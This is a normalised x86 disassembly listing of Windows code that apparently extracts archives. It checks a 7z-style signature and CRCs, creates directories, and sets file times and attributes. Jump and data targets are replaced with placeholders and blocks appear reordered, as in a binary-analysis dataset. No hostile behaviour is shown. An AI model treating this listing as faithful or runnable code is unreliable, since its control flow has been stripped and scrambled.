cmp [ ebp - 0x74 ] 0x0
je r-xdata
jb r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp - 0x64 ]
push edx
lea eax [ ebp - 0x44 ]
push eax
call sub_401070
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x74 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0xa4 ]
jae r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
mov edx [ ebp - 0x44 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_406640
add esp 0xc
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_4010d0
add esp 0x8
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] 0x10
mov edx [ ebp - 0x64 ]
mov ecx [ ebp - 0x44 ]
call sub_401100
cmp eax [ ebp - 0xa8 ]
jne r-xdata
mov ecx [ ebp - 0x44 ]
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x40 ]
mov [ ebp - 0x48 ] edx
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
call sub_403190
add esp 0x8
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
cmp [ ebp - 0x3c ] 0x17
jne r-xdata
cmp [ ebp - 0x3c ] 0x1
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x58 ] 0x4
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
lea edx [ ebp - 0x54 ]
push edx
call sub_401050
add esp 0x4
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
push edx
mov eax [ ecx + 0x20 ]
push eax
lea ecx [ ebp - 0x54 ]
push ecx
lea edx [ ebp - 0x4c ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_405480
add esp 0x18
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_405240
add esp 0x10
mov [ ebp - 0x58 ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_4010d0
add esp 0x8
mov edx [ ebp - 0x54 ]
mov [ ebp - 0x44 ] edx
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x44 ]
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x40 ]
mov [ ebp - 0x48 ] edx
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
call sub_403190
add esp 0x8
mov [ ebp - 0x58 ] eax
mov ecx [ ebp + 0x14 ]
push ecx
lea edx [ ebp - 0x54 ]
push edx
call sub_4010d0
add esp 0x8
jmp r-xdata
sub_405970
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_405540
add esp 0x10
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_402ad0
add esp 0x8
sub_4059b0
push ebp
mov ebp esp
sub esp 0x34
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
mov edx [ ebp + 0x10 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x20 ]
mov [ ecx ] 0x0
mov edx [ ebp + 0x24 ]
mov [ edx ] 0x0
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x28 ]
push edx
mov eax [ ebp + 0x28 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x14 ]
mov eax [ ebp - 0x8 ]
mov [ edx ] eax
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x0
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x0
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x28
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0xc ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
push edx
call sub_4028a0
add esp 0x4
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x2c ]
mov [ ebp - 0xc ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_402e70
add esp 0xc
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0xc ]
xor ecx ecx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x2c ]
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
cmp edx [ ebp - 0x8 ]
je r-xdata
mov esp ebp
pop ebp
retn
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x28 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x28 ]
push edx
mov eax [ ebp + 0x28 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x18 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_406590
add esp 0xc
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
shl eax 0x5
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x10 ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp + 0x20 ]
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x24 ]
mov [ edx ] ecx
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov edx [ ebp + 0x24 ]
add ecx [ edx ]
mov eax [ ebp + 0x1c ]
cmp ecx [ eax ]
jbe r-xdata
mov eax [ ebp - 0x14 ]
shl eax 0x5
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov eax [ edx + eax + 0x8 ]
mov ecx [ ebp + 0x20 ]
add eax [ ecx ]
mov edx [ ebp + 0x20 ]
mov [ edx ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x28 ]
push eax
mov ecx [ ebp + 0x28 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
mov edx [ ebp + 0x18 ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx + 0x1b ]
test edx edx
je r-xdata
mov eax 0xb
jmp r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x18 ]
mov eax [ edx ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x24 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + eax * 4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
lea ecx [ eax + ecx * 8 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call sub_4021e0
add esp 0x20
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov edx [ ebp + 0x20 ]
add ecx [ edx ]
mov eax [ ebp + 0x24 ]
mov edx [ eax ]
call sub_401100
mov ecx [ ebp - 0x18 ]
cmp eax [ ecx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x3
mov edx [ ebp - 0xc ]
mov ecx [ ebp + 0x18 ]
mov ecx [ ecx ]
call sub_401100
mov edx [ ebp - 0x10 ]
cmp eax [ edx + 0x20 ]
je r-xdata
mov [ ebp - 0x4 ] 0x3
sub_405c50
push ebp
mov ebp esp
push ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call [ CreateDirectoryW@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_405c80
push ebp
mov ebp esp
mov eax 0x801c
call sub_413fc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8010 ] 0x0
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8018 ]
cmp [ eax ] __dos_header
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov ecx 0x8000
sub ecx [ ebp - 0x8010 ]
mov [ ebp - 0x8008 ] ecx
lea edx [ ebp - 0x8008 ]
push edx
mov eax [ ebp - 0x8010 ]
lea ecx [ ebp + eax - 0x8004 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_402370
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x8008 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8010 ]
add eax [ ebp - 0x8008 ]
mov [ ebp - 0x8010 ] eax
cmp [ ebp - 0x8010 ] 0x20
jbe r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x8010 ]
sub ecx 0x20
mov [ ebp - 0x8014 ] ecx
mov [ ebp - 0x800c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x800c ]
cmp eax [ ebp - 0x8014 ]
jae r-xdata
mov edx [ ebp - 0x8014 ]
xor eax eax
mov ecx [ ebp + 0xc ]
add edx [ ecx ]
adc eax [ ecx + 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x8010 ]
sub edx [ ebp - 0x8014 ]
mov [ ebp - 0x8010 ] edx
mov eax [ ebp - 0x8010 ]
push eax
mov ecx [ ebp - 0x8014 ]
lea edx [ ebp + ecx - 0x8004 ]
push edx
lea eax [ ebp - 0x8004 ]
push eax
call sub_40f760
add esp 0xc
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8018 ] ecx
mov edx [ ebp - 0x8018 ]
cmp [ edx + 0x4 ] 0x0
ja r-xdata
mov edx [ ebp - 0x800c ]
movzx eax [ ebp + edx - 0x8004 ]
cmp eax 0x37
je r-xdata
mov edx [ ebp - 0x800c ]
cmp edx [ ebp - 0x8014 ]
jne r-xdata
mov ecx [ ebp - 0x800c ]
cmp ecx [ ebp - 0x8014 ]
jae r-xdata
push 0x6
push rw-data
mov eax [ ebp - 0x800c ]
lea ecx [ ebp + eax - 0x8004 ]
push ecx
call sub_418ea2
add esp 0xc
mov [ ebp - 0x801c ] eax
cmp [ ebp - 0x801c ] 0x0
jne r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x800c ]
lea ecx [ ebp + edx - 0x7ff8 ]
mov edx 0x14
call sub_401100
mov ecx [ ebp - 0x800c ]
cmp eax [ ebp + ecx - 0x7ffc ]
jne r-xdata
mov ecx [ ebp - 0x800c ]
add ecx 0x1
mov [ ebp - 0x800c ] ecx
mov edx [ ebp - 0x800c ]
add edx 0x1
mov [ ebp - 0x800c ] edx
mov edx [ ebp - 0x800c ]
xor eax eax
mov ecx [ ebp + 0xc ]
add edx [ ecx ]
adc eax [ ecx + 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
mov eax 0x1
jmp r-xdata
sub_405ea0
push ebp
mov ebp esp
sub esp 0x258
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x258 ] 0x0
lea eax [ ebp - 0x254 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x258 ] eax
cmp [ ebp - 0x258 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x258 ]
push edx
call [ FindClose@IAT ]
mov eax 0x1
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_405f10
push ebp
mov ebp esp
mov eax 0x4724
call sub_413fc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x46d8 ] 0x0
mov [ ebp - 0x46f0 ] 0x0
xor eax eax
mov [ ebp - 0x620 ] ax
push 0x61a
push 0x0
lea ecx [ ebp - 0x61e ]
push ecx
call sub_412270
add esp 0xc
mov edx [ ebp + 0xc ]
mov [ ebp - 0x46e8 ] edx
mov eax [ ebp - 0x46e8 ]
add eax 0x2
mov [ ebp - 0x4708 ] eax
mov ecx [ ebp - 0x46e8 ]
mov dx [ ecx ]
mov [ ebp - 0x46f6 ] dx
add [ ebp - 0x46e8 ] 0x2
cmp [ ebp - 0x46f6 ] 0x0
jne r-xdata
mov eax [ ebp - 0x46e8 ]
sub eax [ ebp - 0x4708 ]
sar eax 0x1
mov [ ebp - 0x4714 ] eax
mov ecx [ ebp - 0x4714 ]
mov [ ebp - 0x46fc ] ecx
mov edx [ ebp + 0xc ]
push edx
push 0x30e
lea eax [ ebp - 0x620 ]
push eax
call sub_40fe10
add esp 0xc
mov ecx [ ebp - 0x46fc ]
mov edx [ ebp + 0xc ]
movzx eax [ edx + ecx * 2 - 0x2 ]
cmp eax 0x5c
je r-xdata
call sub_401130
mov [ ebp - 0x65c ] sub_401000
mov [ ebp - 0x658 ] sub_401030
mov [ ebp - 0x668 ] sub_401000
mov [ ebp - 0x664 ] sub_401030
lea edx [ ebp - 0x638 ]
push edx
call sub_402630
add esp 0x4
push 0x0
lea eax [ ebp - 0x46d4 ]
push eax
call sub_4068b0
add esp 0x8
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x630 ]
push edx
call sub_402300
add esp 0x8
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x620 ]
push ecx
call sub_406570
add esp 0x8
lea edx [ ebp - 0x620 ]
mov [ ebp - 0x46ec ] edx
mov eax [ ebp - 0x46ec ]
add eax 0x2
mov [ ebp - 0x471c ] eax
xorpd xmm0 xmm0
movlpd [ ebp - 0x644 ] xmm0
lea eax [ ebp - 0x644 ]
push eax
lea ecx [ ebp - 0x630 ]
push ecx
call sub_405c80
add esp 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x46f0 ] r--data
mov [ ebp - 0x46d8 ] 0xb
jmp r-xdata
mov ecx [ ebp - 0x46ec ]
mov dx [ ecx ]
mov [ ebp - 0x46fe ] dx
add [ ebp - 0x46ec ] 0x2
cmp [ ebp - 0x46fe ] 0x0
jne r-xdata
mov eax [ ebp - 0x46ec ]
sub eax [ ebp - 0x471c ]
sar eax 0x1
mov [ ebp - 0x4718 ] eax
mov ecx [ ebp - 0x4718 ]
mov [ ebp - 0x46fc ] ecx
push 0x0
lea edx [ ebp - 0x644 ]
push edx
lea eax [ ebp - 0x630 ]
push eax
call sub_4024f0
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x46d8 ] 0xb
jmp r-xdata
cmp [ ebp - 0x46d8 ] 0x0
jne r-xdata
cmp [ ebp - 0x46d8 ] 0x0
je r-xdata
mov [ ebp - 0x46d8 ] 0xb
lea eax [ ebp - 0x6b8 ]
push eax
call sub_402a70
add esp 0x4
cmp [ ebp - 0x46d8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x638 ]
mov [ ebp - 0x46c4 ] ecx
lea edx [ ebp - 0x46d4 ]
push edx
call sub_406900
add esp 0x4
mov [ ebp - 0x46f0 ] r--data
cmp [ ebp - 0x46d8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x668 ]
push ecx
lea edx [ ebp - 0x65c ]
push edx
lea eax [ ebp - 0x46d4 ]
push eax
lea ecx [ ebp - 0x6b8 ]
push ecx
call sub_405970
add esp 0x10
mov [ ebp - 0x46d8 ] eax
lea edx [ ebp - 0x65c ]
push edx
lea eax [ ebp - 0x6b8 ]
push eax
call sub_402ad0
add esp 0x8
lea ecx [ ebp - 0x630 ]
push ecx
call sub_402340
add esp 0x4
cmp [ ebp - 0x46d8 ] 0x0
jne r-xdata
mov [ ebp - 0x4720 ] 0xffffffff
mov [ ebp - 0x4724 ] 0x40000000
mov [ ebp - 0x63c ] 0xffffffff
mov [ ebp - 0x650 ] 0x0
mov [ ebp - 0x62c ] 0x0
mov [ ebp - 0x46dc ] 0x0
jmp r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x46dc ]
cmp eax [ ebp - 0x69c ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x650 ]
push eax
lea ecx [ ebp - 0x65c ]
push ecx
call [ ebp - 0x658 ]
add esp 0x8
mov [ ebp - 0x660 ] 0x0
mov [ ebp - 0x624 ] 0x0
mov ecx [ ebp - 0x46dc ]
shl ecx 0x5
add ecx [ ebp - 0x6a8 ]
mov [ ebp - 0x46e4 ] ecx
push 0x0
mov edx [ ebp - 0x46dc ]
push edx
lea eax [ ebp - 0x6b8 ]
push eax
call sub_404870
add esp 0xc
mov [ ebp - 0x4710 ] eax
cmp [ ebp - 0x4710 ] 0x104
jb r-xdata
mov ecx [ ebp - 0x46fc ]
lea edx [ ebp + ecx * 2 - 0x620 ]
mov [ ebp - 0x46f4 ] edx
mov eax [ ebp - 0x46f4 ]
push eax
mov ecx [ ebp - 0x46dc ]
push ecx
lea edx [ ebp - 0x6b8 ]
push edx
call sub_404870
add esp 0xc
lea eax [ ebp - 0x668 ]
push eax
lea ecx [ ebp - 0x65c ]
push ecx
lea edx [ ebp - 0x624 ]
push edx
lea eax [ ebp - 0x660 ]
push eax
lea ecx [ ebp - 0x62c ]
push ecx
lea edx [ ebp - 0x650 ]
push edx
lea eax [ ebp - 0x63c ]
push eax
mov ecx [ ebp - 0x46dc ]
push ecx
lea edx [ ebp - 0x46d4 ]
push edx
lea eax [ ebp - 0x6b8 ]
push eax
call sub_4059b0
add esp 0x28
mov [ ebp - 0x46d8 ] eax
cmp [ ebp - 0x46d8 ] 0x0
je r-xdata
mov [ ebp - 0x46d8 ] 0xb
jmp r-xdata
mov [ ebp - 0x470c ] 0x0
mov [ ebp - 0x46e0 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x46e0 ]
mov eax [ ebp - 0x46f4 ]
movzx ecx [ eax + edx * 2 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x46e4 ]
movzx edx [ ecx + 0x19 ]
test edx edx
je r-xdata
mov edx [ ebp - 0x46e0 ]
mov eax [ ebp - 0x46f4 ]
movzx ecx [ eax + edx * 2 ]
cmp ecx 0x2f
jne r-xdata
push 0x0
lea ecx [ ebp - 0x620 ]
push ecx
call sub_405ea0
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebp - 0x620 ]
push eax
call sub_405c50
add esp 0x4
jmp r-xdata
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x46e0 ]
mov ecx [ ebp - 0x46f4 ]
mov [ ecx + eax * 2 ] dx
lea edx [ ebp - 0x620 ]
push edx
call sub_405c50
add esp 0x4
mov eax 0x5c
mov ecx [ ebp - 0x46e0 ]
mov edx [ ebp - 0x46f4 ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x46e0 ]
add eax 0x1
mov [ ebp - 0x470c ] eax
lea edx [ ebp - 0x620 ]
push edx
lea eax [ ebp - 0x654 ]
push eax
call sub_402320
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x46f0 ] r--data
mov [ ebp - 0x46d8 ] 0xb
jmp r-xdata
mov edx [ ebp - 0x46dc ]
add edx 0x1
mov [ ebp - 0x46dc ] edx
mov ecx [ ebp - 0x46e0 ]
add ecx 0x1
mov [ ebp - 0x46e0 ] ecx
mov ecx [ ebp - 0x624 ]
mov [ ebp - 0x628 ] ecx
lea edx [ ebp - 0x628 ]
push edx
mov eax [ ebp - 0x650 ]
add eax [ ebp - 0x660 ]
push eax
lea ecx [ ebp - 0x654 ]
push ecx
call sub_402430
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x46f0 ] r--data
mov [ ebp - 0x46d8 ] 0xb
jmp r-xdata
mov [ ebp - 0x46f0 ] r--data
mov [ ebp - 0x46d8 ] 0xb
mov edx [ ebp - 0x628 ]
cmp edx [ ebp - 0x624 ]
je r-xdata
lea edx [ ebp - 0x654 ]
push edx
call sub_402340
add esp 0x4
mov [ ebp - 0x4704 ] eax
cmp [ ebp - 0x46d8 ] 0x0
je r-xdata
mov edx [ ebp - 0x46e4 ]
mov eax [ edx ]
mov [ ebp - 0x64c ] eax
mov ecx [ ebp - 0x46e4 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x648 ] edx
lea eax [ ebp - 0x64c ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x654 ]
push ecx
call [ SetFileTime@IAT ]
mov eax [ ebp - 0x46e4 ]
movzx ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x4704 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x46e4 ]
movzx edx [ ecx + 0x1d ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4704 ]
mov [ ebp - 0x46d8 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x46e4 ]
mov ecx [ eax + 0x14 ]
push ecx
lea edx [ ebp - 0x620 ]
push edx
call [ SetFileAttributesW@IAT ]
sub_406590
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
push 0x0
lea edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
call edx
add esp 0xc
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_4065d0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
call edx
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x8 ]
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
sub ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] ecx
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
je r-xdata
sub_406640
push ebp
mov ebp esp
push 0x6
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4065d0
add esp 0x10
pop ebp
retn
sub_406660
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ecx + 0x18 ]
sub eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax ]
jae r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] 0x0
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x14 ]
mov eax [ ebp - 0xc ]
lea ecx [ eax + edx + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ edx ] eax
mov edx [ ebp - 0xc ]
mov [ edx + 0x14 ] 0x0
mov [ ebp - 0x8 ] 0x4000
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
add ecx 0x1c
push ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x10 ]
mov eax [ edx ]
call eax
add esp 0xc
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x18 ] edx
sub_406710
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x18 ]
sub eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx ]
jae r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
lea eax [ edx + ecx + 0x1c ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x4000
jbe r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp - 0x4 ]
add eax 0x1c
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov edx [ ecx ]
call edx
add esp 0xc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ecx ] 0x4000
sub_4067c0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
add edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] edx
xor eax eax
mov esp ebp
pop ebp
retn
sub_4067e0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x18 ]
sub eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
jne r-xdata
